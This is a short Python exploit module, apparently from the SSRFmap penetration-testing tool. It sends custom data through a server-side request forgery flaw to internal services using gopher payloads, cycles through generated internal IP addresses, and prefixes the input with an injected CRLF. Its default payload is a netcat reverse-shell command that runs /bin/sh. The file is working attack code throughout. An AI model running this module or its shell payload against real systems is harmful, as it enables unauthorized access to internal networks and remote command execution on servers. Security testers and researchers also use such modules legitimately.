from ssrfmap.core.utils import *
import urllib.parse
import logging

name          = "custom"
description   = "Send custom data to a listening service, e.g: netcat"
author        = "Swissky"
documentation = []

class exploit():
    SERVICE_IP   = "127.0.0.1"
    SERVICE_PORT = "8080"
    SERVICE_DATA = "/bin/nc 127.0.0.1 4444 -e /bin/sh &"

    def __init__(self, requester, args):
        logging.info("Module '{}' launched !".format(name))
        gen_hosts = gen_ip_list("127.0.0.1", args.level)
        self.SERVICE_PORT = input("Service Port: ")
        self.SERVICE_DATA = "%0d%0a"+urllib.parse.quote(input("Service Data: "))

        for gen_host in gen_hosts:
            payload = wrapper_gopher(self.SERVICE_DATA, gen_host, self.SERVICE_PORT)
            
            if args.verbose == True:
                logging.info("Generated payload : {}".format(payload))

            r = requester.do_request(args.param, payload)

            if args.verbose == True:
                logging.info("Module '{}' ended !".format(name))